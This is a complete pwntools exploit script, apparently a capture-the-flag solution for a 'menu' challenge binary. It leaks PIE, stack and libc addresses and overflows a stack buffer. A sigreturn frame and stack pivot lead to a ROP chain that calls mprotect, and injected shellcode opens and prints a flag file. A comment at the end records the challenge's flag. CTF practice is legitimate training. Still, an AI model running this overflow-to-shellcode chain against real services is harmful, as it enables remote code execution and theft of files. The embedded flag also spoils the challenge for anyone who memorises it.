#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc menu.challs.csc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.recvuntil(b"0x")
    exe.address = int(r.recv(12), 16) - exe.sym.greeting
    log.info(f"PIE @ {hex(exe.address)}")
    rop = ROP(exe)

    r.sendline(b"A"*216 + p64(rop.ret.address) + p64(exe.sym.reset) + p64(exe.sym.greeting+183) + p64(exe.sym._start)*2)
    r.recvuntil(b"Your order is on its way!\n")
    stack = int(r.recvline()[4:], 16) + 8256
    log.info(f"STACK @ {hex(stack)}")

    frame = SigreturnFrame()
    frame.rdi = exe.got.puts       
    frame.rip = exe.plt.puts
    frame.rsp = stack
    frame.rbp = stack + 0x1000
 
    payload = bytes(frame)
    payload = payload[:208] + p64(stack+0xd0+216) + p64(exe.sym.menu+45) + payload[232:]
  
    r.send(b"A"*208 + p64(stack+0xd0) + p64(exe.sym.menu+45) + p64(rop.ret.address) + b"\xb4")
    r.recvuntil(b"Your order is on its way!\n")
    r.send(p64(exe.sym._start) + (b"flag\0\0\0\0") + payload[16:] + b"\0"*184 + p64(stack-16) + p64(rop.leave.address)*2)
    r.recvuntil(b"Your order is on its way!\n")
    #gdb.attach(r)
    r.send(p64(rop.leave.address) + b"\0"*7)
    libc.address = u64(r.recv(6)+b"\0\0") - libc.sym.puts
    log.info(f"LIBC @ {hex(libc.address)}")

    rop = ROP(libc)
    log.info(hex(stack+8))
    rop.raw(b'A'*216)

    stack = stack & 0xfffffffffffff000
    stack -= 0x2000
    rop.call("mprotect", [stack, 0x1000, 7])
    rop.read(0, stack, 0x1000)
    rop.raw(stack)

    #gdb.attach(r, gdbscript="c")
    r.send(rop.chain())
    r.recvuntil(b"Your order is on its way!\n")

    shellcode = asm(f"""
    xor rdi, rdi
    sub rdi, 100
    mov rcx, {u64(b"flag\0\0\0\0")}
    push rcx
    mov rsi, rsp
    push 0
    push 0
    push 0
    mov rdx, rsp
    mov r10, 0x18
    mov rax, 0x1b5
    syscall""")

    shellcode += asm(shellcraft.read(3, exe.bss(0x100), 0x80))
    shellcode += asm(shellcraft.write(1, exe.bss(0x100), 0x80))

    r.send(shellcode)

    r.interactive()
    #CSCTF{th3_s3cr3t_0rd3r_348678943723879fdhg73389}

if __name__ == "__main__":
    main()